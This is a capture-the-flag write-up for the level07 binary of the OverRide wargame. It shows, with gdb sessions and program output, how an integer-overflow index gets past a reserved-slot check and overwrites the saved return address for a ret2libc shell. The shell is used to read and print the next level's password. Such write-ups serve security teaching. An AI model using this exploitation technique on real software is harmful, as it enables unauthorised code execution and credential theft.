
this level has the concpet of intiger overflow and underflow

there is a program that has some certain commands:
	-> store:
		* number : store a number
		* index : choose the index u prefer to store the nummber at
	-> read:
		* index : read table at the given index
	-> quit:
		at it says it quits
	

the program store number at a given index but it checkes the index if [index % 3 == 0]
it stops us from storing the number claiming it's reserved by will

we need to find the eip address first so we perform a ret2libc technique to get a shell

we put a break on the store_number to get the first address of the table which is in the [ebp+0x8]:
--------------------------------
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/users/level07/level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store

Breakpoint 1, 0x08048636 in store_number ()
(gdb) x $ebp+0x8
0xffffd500:	0xffffd524
(gdb)
--------------------------------

so the address is 0xffffd524

now we need the address of the main: 
--------------------------------
(gdb) b *0x080489f1
Breakpoint 2 at 0x80489f1
(gdb) c
Continuing.
 Number: 1
 Index: 1
 Completed store command successfully
Input command: quit

Breakpoint 2, 0x080489f1 in main ()
(gdb) x/wx $esp
0xffffd6ec:	0xf7e45513
(gdb)
--------------------------------

we got it it's in 0xffffd6ec

now let's get the offset:  0xffffd6ec - 0xffffd524 = 456
 so it's in 456 but because int has 4 bytes we need to dvided by 4 to get the right index
 so its 456 / 4 = 114

114 is devided by 3 as [114 % 3 == 0] so we need another way to write in that address index
and that's where we gonna user int overflow we know that the max unsigned is (2 ** 32)

so it's (2 ** 32) + 114 / 4 = 1073741938

now we need the system address, exit address and /bin/sh
--------------------------------
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) find &system, +9999999, "/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
(gdb) p exit
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
(gdb)
--------------------------------

let's get the decimal form of each address knowing that the table is a table of ints
system 		= 0xf7e6aed0 = 4159090384
exit 		= 0xf7e5eb70 = 4159040368
"/bin/sh" 	= 0xf7f897ec = 4160264172 

now let's store it in the table one by one:
	-> 4159090384 in index : 1073741938
	-> 4159040368 in index : 115
	-> 4160264172 in index : 116


--------------------------------
level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4159040368
 Index: 115
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
$
--------------------------------


